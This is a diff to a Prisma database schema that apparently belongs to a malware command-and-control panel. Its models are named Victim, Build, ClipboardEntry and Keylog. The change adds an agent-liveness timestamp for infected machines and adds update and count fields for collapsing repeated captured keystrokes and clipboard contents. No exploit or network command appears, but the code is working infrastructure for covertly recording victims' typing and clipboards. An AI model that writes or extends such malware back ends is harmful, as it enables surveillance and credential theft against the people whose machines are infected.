@@ -142,6 +142,8 @@ model Victim {
   deviceTokenEnc  String
   firstSeenAt     DateTime         @default(now())
   lastHeartbeatAt DateTime         @default(now())
+  /// Liveness from a real agent message; bridge pings never touch it.
+  lastAgentMessageAt DateTime      @default(now())
   revokedAt       DateTime?
   build           Build            @relation(fields: [buildId], references: [id], onDelete: Restrict)
   sessions        SessionInfo[]
@@ -158,6 +160,7 @@ model Victim {
 
   @@unique([buildId, hostname, username])
   @@index([status, lastHeartbeatAt])
+  @@index([lastAgentMessageAt])
   @@index([os, country])
 }
 
@@ -270,6 +273,8 @@ model ClipboardEntry {
   id       String   @id @default(uuid()) @db.Uuid
   victimId String   @db.Uuid
   ts       DateTime @default(now())
+  updatedAt DateTime @default(now())
+  count    Int      @default(1)
   window   String   @default("")
   process  String   @default("")
   content  String
@@ -284,6 +289,8 @@ model Keylog {
   id       String   @id @default(uuid()) @db.Uuid
   victimId String   @db.Uuid
   ts       DateTime @default(now())
+  updatedAt DateTime @default(now())
+  count    Int      @default(1)
   process  String   @default("")
   title    String   @default("")
   text     String
